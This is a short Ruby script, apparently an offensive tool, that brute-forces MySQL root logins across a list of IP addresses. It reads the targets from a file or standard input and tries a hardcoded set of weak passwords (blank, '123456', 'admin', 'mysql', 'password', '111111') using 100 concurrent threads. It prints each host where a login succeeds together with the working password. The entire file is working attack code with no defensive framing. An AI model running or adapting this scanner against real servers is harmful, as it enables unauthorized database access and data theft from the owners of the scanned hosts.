require 'mysql2'
require 'pp'
require 'thread/pool'
#gem install mysql2
#gem install thread

#if !ARGV[0]
#  puts "usage: #{$0} <host_file>"
#  exit
#end

$passwords = ["", '123456', 'admin', 'mysql', 'password', '111111']
#$passwords = [""]

class MysqlBrute
  def initialize
  end

  def run(host, username, password, port=3306)
    success = false
    begin
      dbh = Mysql2::Client.new(:host=>host,:username=>username, :password=>password, :port=>port, :connect_timeout=>5) 
      results = dbh.query("SELECT VERSION();")
      success = true if results.size>0
    rescue Mysql2::Error => e
      #puts e
    ensure
      dbh.close if dbh
    end
    success
  end
end

$pool = Thread.pool(100)

if ARGV[0]
# read host file
File.open(ARGV[0], 'r') { |f|
  f.each { |l|
    re = /((?:(?:[0-9][0-9]?|[0-1][0-9][0-9]|[2][0-4][0-9]|[2][5][0-5])\.){3}(?:[0-9][0-9]?|[0-1][0-9][0-9]|[2][0-4][0-9]|[2][5][0-5]))(?:\:(\d{1,5}))?/.match l
    if re && re[1]
      port = 3306
      port = re[2].to_i if re[2]
      $passwords.each { |p|
        $pool.process ({:host=>re[1], :user=>'root', :pass=>p, :port=>port})  { |obj|
          if MysqlBrute.new.run(obj[:host], obj[:user], obj[:pass], obj[:port])
            puts "[SUCCESS]"+obj[:host]+" password is : " + obj[:pass]
          else
            #puts "[FAILED]"+obj[:host]+" of password :" + obj[:pass]
          end
        }
      }
    end
  }
}
else
  while l = gets
    re = /((?:(?:[0-9][0-9]?|[0-1][0-9][0-9]|[2][0-4][0-9]|[2][5][0-5])\.){3}(?:[0-9][0-9]?|[0-1][0-9][0-9]|[2][0-4][0-9]|[2][5][0-5]))(?:\:(\d{1,5}))?/.match l
    if re && re[1]
      port = 3306
      port = re[2].to_i if re[2]
      $passwords.each { |p|
        $pool.process ({:host=>re[1], :user=>'root', :pass=>p, :port=>port})  { |obj|
          if MysqlBrute.new.run(obj[:host], obj[:user], obj[:pass], obj[:port])
            puts "[SUCCESS]"+obj[:host]+" password is : " + obj[:pass]
          else
            #puts "[FAILED]"+obj[:host]+" of password :" + obj[:pass]
          end
        }
      }
    end
  end
end

#while !$pool.done? do
#  pp $pool
#  sleep 1
#end
$pool.wait_done
$pool.shutdown
# each line MysqlBurte.new.run()
